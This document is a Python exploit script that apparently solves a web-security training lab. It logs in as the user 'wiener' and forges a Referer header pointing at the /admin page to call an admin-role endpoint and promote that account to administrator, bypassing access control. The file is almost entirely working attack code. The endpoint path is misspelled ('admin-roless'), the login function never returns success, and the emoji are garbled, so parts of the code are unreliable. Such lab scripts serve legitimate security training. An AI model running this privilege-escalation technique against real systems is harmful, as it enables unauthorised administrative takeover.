import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080"
    
}

def login_wiener(session, url):
    """
    Logs in to the Wiener account.
    Returns True if login is successful, otherwise False.
    """
    print("\n(üëÄ) Attempting to login to Wiener account...\n")
    login_url = f"{url}/login"
    login_data = {
        "username": "wiener",
        "password": "peter"
    }
    try:
        response = session.post(url=login_url, data=login_data, verify=False, proxies=proxy)
        if "Log out" in response.text:
            print("(üòé) Login successful.\n")
            print("(‚ò†Ô∏è) Attempting to promote Wiener to admin...\n")
            admin_url = f"{url}/admin-roless?username=wiener&action=upgrade"
            header = {"Referer":url+"/admin"}
            response = session.get(url=admin_url ,headers=header, verify=False, proxies=proxy)
            if "Admin panel" in response.text:
                print("(‚úÖ) Wiener Successfully Promoted to Administrator ..\n")
            else:
                print("(ü•π) Failed to Promote wiener ..")
        else:
            print("(ü•π) Login failed. Check credentials or target.\n")
            return False
    except requests.exceptions.RequestException as e:
        print(f"(‚ùå) Error during login: {e}")
        return False



def validate_target(url):
    """
    Validates if the target URL is reachable.
    Returns True if reachable, otherwise False.
    """
    print("(üîç) Validating the target...")
    try:
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            print("(+) Target is reachable.\n")
            return True
        else:
            print(f"(-) Target returned status code {response.status_code}.\n")
            return False
    except requests.exceptions.ConnectTimeout:
        print("(-) Connection timed out.\n")
        return False
    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to the target.\n")
        return False
    except requests.exceptions.RequestException as e:
        print(f"(-) An error occurred: {e}\n")
        return False

def main():
    # Argument validation
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()

    # Validate target
    if not validate_target(url):
        sys.exit(1)

    # Login and promote to admin
    login_wiener(session, url)
       

if __name__ == "__main__":
    main()
